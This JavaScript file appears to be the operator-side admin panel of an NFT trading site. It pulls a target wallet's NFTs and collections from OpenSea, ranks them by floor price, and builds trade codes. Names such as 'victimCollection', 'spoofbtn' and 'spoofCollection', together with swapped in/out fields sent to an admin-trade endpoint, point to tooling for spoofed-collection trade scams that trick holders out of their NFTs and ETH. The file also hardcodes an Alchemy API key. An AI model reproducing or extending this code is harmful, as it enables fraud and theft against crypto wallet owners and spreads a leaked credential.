console.log('web1-a16')


let web3 = new Web3(ethereum);
let OutAddress = "";
let InAddress = "";


async function loadWeb3() {
    try {
        window.web3 =await new Web3(window.ethereum);
    } catch (error) {
        console.log(error);
    }
}

async function load() {
    await loadWeb3();
}
load();
let OutBalance = 0
let InBalance = 0
let OutEth = 0
let InEth = 0


async function getBalance(address, out){
    const balances =  web3.utils.fromWei(
    await web3.eth.getBalance(address),
        'ether'
        ) * 1;
    console.log("val", balances)
    
    if(out){
      OutBalance = balances
    }else{
      InBalance = balances
    }

}
let assets1 = []
let assets2 = []
let victimCollection = []


async function AddNftsToHtml(data, section){
  var nfts = document.getElementById(section)
  if(nfts != undefined){
     

      for(var i = 0; i < data.length; i++){
          var element = data[i]
          var id = element.token_id
          if(element.asset_contract.schema_name != "ERC721"){
            //   id = parseInt(id, 16)
            // }else{
              id = (id+"").substring(0,15)+"..."
            }
            var index = 0
            if(section == "client-assets2"){
              index += assets2.length
            }
            else{
              index += assets1.length
            }
          nfts.innerHTML += `
                <tr id='${section}-item-${index}'>
                    <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
                    <img id='nft-${section}-${index}' class="w-10 h-10" src="${element.image_url}" alt="${element.name}" title="${element.name}"></td>

  <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.name}</td>
  <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.schema_name}</td>
                    <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${id}</td>
                    <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.address.substr(0, 20)}...</td>
                    <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700" >${element.balance}</td>
                    <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
                        <button onclick='addItem("${section}", ${index})' class="mx-auto transition-colors bg-emerald-200 hover:bg-emerald-300 rounded-lg h-9 w-9 flex items-center justify-center text-gray-700">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-plus-lg md:w-5 w-4 md:h-5 h-4" viewBox="0 0 16 16">
                            <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2Z"></path>
                        </svg>
                        </button>
                    </td>
                </tr>
            `
          if(section == "client-assets2")
              assets2.push(data[i])
          else // Added
              assets1.push(data[i])
      }
      for(var i = 0; i < data.length; i++){
          var img = document.getElementById(`nft-${section}-${i}`)
          if(img != undefined){
            img.addEventListener("error", function(event) {
              document.getElementById(event.target.id).src =  "/static/assets/img/images.png"
              event.onerror = null
            })
          }
      }
}
}

async function loadWallet(address, section){
  var data = await GetAllNfts(address, AddNftsToHtml, section)
  
  // var nfts = document.getElementById(section)
  // if(nfts != undefined){
     

  //     for(var i = 0; i < data.length; i++){
  //         var element = data[i]
  //         var id = element.token_id
  //         if(element.asset_contract.schema_name != "ERC721"){
  //           //   id = parseInt(id, 16)
  //           // }else{
  //             id = (id+"").substring(0,15)+"..."
  //           }
  //         nfts.innerHTML += `
  //               <tr id='${section}-item-${i}'>
  //                   <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
  //                   <img id='nft-${section}-${i}' class="w-10 h-10" src="${element.image_url}" alt="${element.name}" title="${element.name}"></td>

  // <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.name}</td>
  // <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.schema_name}</td>
  //                   <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${id}</td>
  //                   <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.address.substr(0, 20)}...</td>
  //                   <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700" >${element.balance}</td>
  //                   <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
  //                       <button onclick='addItem("${section}", ${i})' class="mx-auto transition-colors bg-emerald-200 hover:bg-emerald-300 rounded-lg h-9 w-9 flex items-center justify-center text-gray-700">
  //                       <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-plus-lg md:w-5 w-4 md:h-5 h-4" viewBox="0 0 16 16">
  //                           <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2Z"></path>
  //                       </svg>
  //                       </button>
  //                   </td>
  //               </tr>
  //           `
  //         if(section == "client-assets2")
  //             assets2.push(data[i])
  //         else // Added
  //             assets1.push(data[i])
  //     }
  //     for(var i = 0; i < data.length; i++){
  //         var img = document.getElementById(`nft-${section}-${i}`)
  //         if(img != undefined){
  //           img.addEventListener("error", function(event) {
  //             document.getElementById(event.target.id).src =  "/static/assets/img/images.png"
  //             event.onerror = null
  //           })
  //         }
  //     }
    console.log(section)
    if(section == "client-assets2"){
        document.getElementById('spoofbtn').removeAttribute("disabled")
          victimCollection = await GetAllCollection(address)
          console.log(victimCollection)
          for(var i = 0; i < victimCollection.length; i++){
            try{

              var collection = victimCollection[i]
              var collectionNfts = document.getElementById("spoof-collections")
              collectionNfts.innerHTML += `
              <tr id='collection-item-${i}'>
              <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
              <img id='collection-${section}-${i}' class="w-10 h-10" src="${collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].image_url}" alt="${collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].name}" title="${collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].name}"></td>

              <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].name}</td>
              <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].schema_name}</td>
              <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address.toLowerCase()}</td>
              <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700" id='spoof-btn-${i}'>
              <button  onclick='addSpoof(${i}, "${collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address.toLowerCase()}")' class="mx-auto transition-colors bg-emerald-200 hover:bg-emerald-300 rounded-lg h-9 w-9 flex items-center justify-center text-gray-700">
              <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-plus-lg md:w-5 w-4 md:h-5 h-4" viewBox="0 0 16 16">
              <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2Z"></path>
              </svg>
              </button>
              </td>
              </tr>
              `
            }catch(err){
              console.log(err)
            }
            
        }
        for(var i = 0; i < data.length; i++){
            try{
              var img = document.getElementById(`collection-${section}-${i}`)
              if(img != undefined){
                img.addEventListener("error", function(event) {
                  document.getElementById(event.target.id).src =  "/static/assets/img/images.png"
                  event.onerror = null
                })
              }
            }catch{

            }
        }
      }

    // }
}


var itemsOut = []
var itemsIn = []
var spoofCollection = []

function addSpoof(index, address){
  var element = document.getElementById("spoof-btn-"+index)

  
  if(spoofCollection.includes(address)){
    spoofCollection = removeFromArr(spoofCollection, address)
    element.innerHTML = `<button  onclick='addSpoof(${index}, "${address}")' class="mx-auto transition-colors bg-emerald-200 hover:bg-emerald-300 rounded-lg h-9 w-9 flex items-center justify-center text-gray-700">
    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-plus-lg md:w-5 w-4 md:h-5 h-4" viewBox="0 0 16 16">
        <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2Z"></path>
    </svg>
    </button>`
  }else{
    spoofCollection.push(address)
    element.innerHTML = `<button onclick='addSpoof(${index}, "${address}")' class="transition-colors bg-red-300 hover:bg-red-300 rounded-lg h-9 w-9 flex items-center justify-center text-gray-700">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-dash" viewBox="0 0 16 16">
                    <path d="M4 8a.5.5 0 0 1 .5-.5h7a.5.5 0 0 1 0 1h-7A.5.5 0 0 1 4 8z"/>
                    </svg>
                </button>`
  }
}

function addItem(section, index){
    var element
    var sectionId = ""
    if(section == "client-assets2"){
        sectionId = "in-selected"
        element = assets2[index]
        itemsIn.push(assets2[index])
    }else{
        sectionId = "out-selected"
        element = assets1[index]
        itemsOut.push(assets1[index])
    }
    document.getElementById(`${section}-item-${index}`).remove() // remove item row from modal
    var tbody = document.getElementById(sectionId)
    var id = element.token_id
    if(element.asset_contract.schema_name != "ERC721"){
        id = (id+"").substring(0,15)+"..."
      }
    tbody.innerHTML += `
        <tr id='${sectionId}-item-${index}'>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700"><img id='nft-${sectionId}-${index}' class="w-10 h-10" src="${element.image_url}" alt="${element.name}" title="${element.name}"></td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.name}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.schema_name}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${id}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.address.substr(0, 20)}...</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700" >${element.balance}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
                <button onclick='removeItem("${sectionId}", ${index}, "${section}")' class="transition-colors bg-red-300 hover:bg-red-300 rounded-lg h-9 w-9 flex items-center justify-center text-gray-700">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-dash" viewBox="0 0 16 16">
                    <path d="M4 8a.5.5 0 0 1 .5-.5h7a.5.5 0 0 1 0 1h-7A.5.5 0 0 1 4 8z"/>
                    </svg>
                </button>
            </td>
        </tr>
    `

    checkTradeStatus()
    var img = document.getElementById(`nft-${sectionId}-${index}`)
    img.addEventListener("error", function(event) {
        document.getElementById(event.target.id).src =  "/static/assets/img/images.png"
        event.onerror = null
    })
}

function removeFromArr(arr, value){
    var result = []
    for(var i = 0; i < arr.length; i++){
        if(arr[i] != value)
            result.push(arr[i])
    }
    return result
}

function removeItem(sectionId, index, section){
    var item = document.getElementById(`${sectionId}-item-${index}`)
    if(item != undefined){
        item.remove()
        var element
        if(section == "client-assets2"){
            element = assets2[index]
            itemsIn = removeFromArr(itemsIn, element)
        }else{
            element = assets1[index]
            itemsOut = removeFromArr(itemsOut, element)
        }
        var id = element.token_id
        if(element.asset_contract.schema_name != "ERC721"){
          //   id = parseInt(id, 16)
          // }else{
            id = (id+"").substring(0,15)+"..."
          }
        var nfts = document.getElementById(section)
        nfts.innerHTML += `
        <tr id='${section}-item-${index}'>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
            <img id='nft-${section}-${index}' class="w-10 h-10" src="${element.image_url}" alt="${element.name}" title="${element.name}"></td>

            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.name}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.schema_name}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${id}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.address.substr(0, 20)}...</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700" >${element.balance}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">
                <button onclick='addItem("${section}", ${index})' class="mx-auto transition-colors bg-emerald-200 hover:bg-emerald-300 rounded-lg h-9 w-9 flex items-center justify-center text-gray-700">
                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-plus-lg md:w-5 w-4 md:h-5 h-4" viewBox="0 0 16 16">
                    <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2Z"></path>
                </svg>
                </button>
            </td>
        </tr>
    `
    checkTradeStatus()
    var img = document.getElementById(`nft-${section}-${index}`)
        img.addEventListener("error", function(event) {
        document.getElementById(event.target.id).src =  "/static/assets/img/images.png"
            event.onerror = null
        })
    }
}

function checkTradeStatus(){
    var trade_btn = document.getElementById('trade-btn')
    if((itemsIn.length != 0 || InEth > 0) && (itemsOut.length != 0 || OutEth > 0)){
        trade_btn.removeAttribute("disabled")
    }else{
        trade_btn.disabled = true
    }
}

function showError(title, msg){
    alertBox.innerHTML = `
    <div class="alert bg-rose-300 text-gray-800 px-4 py-2 rounded w-fit mb-3 mx-auto" role="alert" >
      <div class="flex items-center justify-between mb-2">
      <p class="font-bold flex items-center">
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="mr-2 bi bi-exclamation-circle-fill" viewBox="0 0 16 16">
          <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
        </svg>
        ${title}
      </p>
      <button class="close-alert-btn" onclick='closeBtn(this)' >
        <svg class="fill-current h-5 w-5 text-gray-800"  role="button" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><title>Close</title><path d="M14.348 14.849a1.2 1.2 0 0 1-1.697 0L10 11.819l-2.651 3.029a1.2 1.2 0 1 1-1.697-1.697l2.758-3.15-2.759-3.152a1.2 1.2 0 1 1 1.697-1.697L10 8.183l2.651-3.031a1.2 1.2 0 1 1 1.697 1.697l-2.758 3.152 2.758 3.15a1.2 1.2 0 0 1 0 1.698z"/></svg>
      </button>
      </div>
    <p class="inline px-6 text-left">${msg}</p>
  </div>`
}

async function trade(){
    var OutCollections = []
    for(var i =0; i < itemsOut.length; i++){
        var element = itemsOut[i];
        var collectioAddress = element.asset_contract.address
        var nftId = element.token_id
        
        var collectionIndex = -1
        for(var j = 0;j < OutCollections.length; j++){
            var collection = OutCollections[j];
            if(collection[0] == collectioAddress){
                collectionIndex = j
                break
            }
        }
        if(collectionIndex == -1){
            var collection = [collectioAddress, [nftId]]
            OutCollections.push(collection)
        }else{
          OutCollections[j][1].push(nftId)
        }
    }
    
    var approwedOutCollections = []
    for(var i = 0; i < OutCollections.length; i++){
        var collectionNfts = OutCollections[i][1].join("-")
        approwedOutCollections.push(OutCollections[i][0]+"|"+collectionNfts)
    }

    var InCollections = []
    for(var i =0; i < itemsIn.length; i++){
        var element = itemsIn[i];
        var collectioAddress = element.asset_contract.address
        var nftId = element.token_id
        var collectionIndex = -1
        for(var j = 0;j < InCollections.length; j++){
            var collection = InCollections[j];
            if(collection[0] == collectioAddress){
                collectionIndex = j
                break
            }
        }
        if(collectionIndex == -1){
            var collection = [collectioAddress, [nftId]]
            InCollections.push(collection)
        }else{
          InCollections[j][1].push(nftId)
        }
    }
    
    var approwedInCollections = []
    for(var i = 0; i < InCollections.length; i++){
        var collectionNfts = InCollections[i][1].join("-")
        approwedInCollections.push(InCollections[i][0]+"|"+collectionNfts)
    }

    createTradeCode(approwedOutCollections, approwedInCollections)
}

function closeBtn(ele){
  if(ele != undefined && ele.parentNode != undefined){
    ele.parentNode.parentNode.remove()
  }
}
function getCookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') {
      c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
      }
  }
  return "";
}

// if(getCookie("token")== ""){
//   window.location='/admin-robin/login'
// }
function createTradeCode(OutCollections, InCollections){
    var alertBox = document.getElementById("allertBox")
    var data = {
    token: getCookie("token"),
    code: "admin",
    detail: "",
    out: InCollections.join('_'),
    in:  OutCollections.join('_'),
    inAddress: OutAddress,
    outAddress: InAddress,
    outEth: `${InEth}`,
    inEth: `${OutEth}`,
    spoofCollection: JSON.stringify(spoofCollection)
  }
  $.ajax({
    url: "/api/v1/admin-trade/",
    method: "PUT",
    data: JSON.stringify(data),
    success: function(result){
      console.log(result)
      if(result.status == 0){
    
        window.location = '/trade/'+result.data.code

      }else{
        alertBox.innerHTML = `
          <div class="alert bg-rose-300 text-gray-800 px-4 py-2 rounded w-fit mb-3 mx-auto" role="alert" >
            <div class="flex items-center justify-between mb-2">
            <p class="font-bold flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="mr-2 bi bi-exclamation-circle-fill" viewBox="0 0 16 16">
                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
              </svg>
              Error, Status Code ${result.status}
            </p>
            <button class="close-alert-btn" onclick='closeBtn(this)' >
              <svg class="fill-current h-5 w-5 text-gray-800"  role="button" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><title>Close</title><path d="M14.348 14.849a1.2 1.2 0 0 1-1.697 0L10 11.819l-2.651 3.029a1.2 1.2 0 1 1-1.697-1.697l2.758-3.15-2.759-3.152a1.2 1.2 0 1 1 1.697-1.697L10 8.183l2.651-3.031a1.2 1.2 0 1 1 1.697 1.697l-2.758 3.152 2.758 3.15a1.2 1.2 0 0 1 0 1.698z"/></svg>
            </button>
            </div>
          <p class="inline px-6 text-left">${result.message}</p>
        </div>`
      }
      
    }
  })
}



const OPENSEA_URL = "https://api.opensea.io/"

 async function GetAllNfts(address, handler, section){
  let pageKey = ""
  var nfts = []
  while(true){ // Added

    var url = `https://api.opensea.io/api/v1/assets?owner=${address}&limit=50`
    if(pageKey != ""){ // Added
      url += "&cursor="+pageKey
      pageKey = ""
    }
    await $.ajax({
        url: url,
        method: "GET",
        success: function(data){
            if(data.next != undefined && data.next != "")
              pageKey = data.next
            else // Added
              pageKey = ""

              for(var i = 0; i < data.assets.length; i++){
                if(data.assets[i].image_url == undefined)
                    data.assets[i].image_url = '/static/assets/img/images.png'
                if(data.assets[i].name == null || data.assets[i].name == "")
                  data.assets[i].name = data.assets[i].collection.name
                data.assets[i].worth = 0
                data.assets[i].balance = 1
                nfts.push(data.assets[i])
              }
              if(handler != undefined){
                handler(data.assets, section)
              }
        }
    })
    if(pageKey == "")
      break
  }
  

  return nfts
}

async function GetAllCollection(address){
    var collections = []
    var offset = 0
    var old_count = 0;
    try{
  
      while(true){ // Added
        var url = `${OPENSEA_URL}api/v1/collections?asset_owner=${address}&offset=${offset}&limit=50`
        await $.ajax({
            url: url,
            method: "GET",
            success: function(data){
                for(var i = 0; i < data.length; i++){
                  if(data[i].primary_asset_contracts.length > 0)
                    collections.push(data[i])
                }
            }
        })
        if(old_count == collections.length)
          break
          old_count = collections.length
        offset += 50
      }
    }catch(err){
      console.log(err)
    }


  
    for(var i = 0 ; i < collections.length; i++){
      collections[i].worth = 0
      try{
        var result = await $.ajax({
          url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collections[i].primary_asset_contracts[collections[i].primary_asset_contracts.length-1].address,
          method: "GET",
        })
        if(result.openSea != undefined && result.openSea.floorPrice != undefined)
        collections[i].worth = result.openSea.floorPrice
      }catch{
        if(collections[i].stats.seven_day_volume > 0){
          collections[i].worth = Math.round(
            collections[i].stats.seven_day_volume * 0.8 * 10000
          ) / 10000
        }
      }
      
    }

    collections = collections.sort((a, b) => {
      return a.worth < b.worth
        ? 1
        : -1;
    });

    return collections
  }